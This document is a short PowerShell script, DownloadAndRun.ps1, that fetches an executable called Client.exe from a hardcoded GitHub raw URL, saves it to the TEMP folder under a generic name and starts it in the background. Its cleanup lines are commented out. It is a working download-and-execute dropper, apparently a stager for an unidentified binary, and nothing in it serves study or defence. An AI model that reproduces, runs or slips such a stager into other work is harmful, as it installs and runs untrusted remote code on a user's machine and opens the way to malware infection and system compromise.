<# 
.SYNOPSIS
    Downloads and executes an executable file from a specified URL.
.DESCRIPTION
    This script downloads an executable from a given URL, saves it to a temporary location,
    and then executes it in the background. It includes basic error handling and cleanup.
.NOTES
    File Name      : DownloadAndRun.ps1
    Author         : Your Name
    Prerequisite   : PowerShell 5.1 or later
#>
 
# Parameters
$url = "https://github.com/m4x7c/dhhh/raw/refs/heads/main/Client.exe"
$outputFile = "$env:TEMP\downloadedFile.exe"
 
try {
    Write-Host "Downloading file from $url..."
    Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
 
    if (Test-Path $outputFile) {
        Write-Host "File downloaded successfully to $outputFile"
 
        # Run in background (no -Wait)
        Write-Host "Executing the file in the background..."
        Start-Process -FilePath $outputFile -ErrorAction Stop
 
        # Clean up after short delay (optional)
        # Start-Sleep -Seconds 10
        # Remove-Item -Path $outputFile -Force
        # Write-Host "Temporary file removed."
    } else {
        Write-Error "Download failed - file not found at $outputFile"
    }
}
catch {
    Write-Error "An error occurred: $_"
    exit 1
}
 
Write-Host "Operation completed successfully."
exit 0
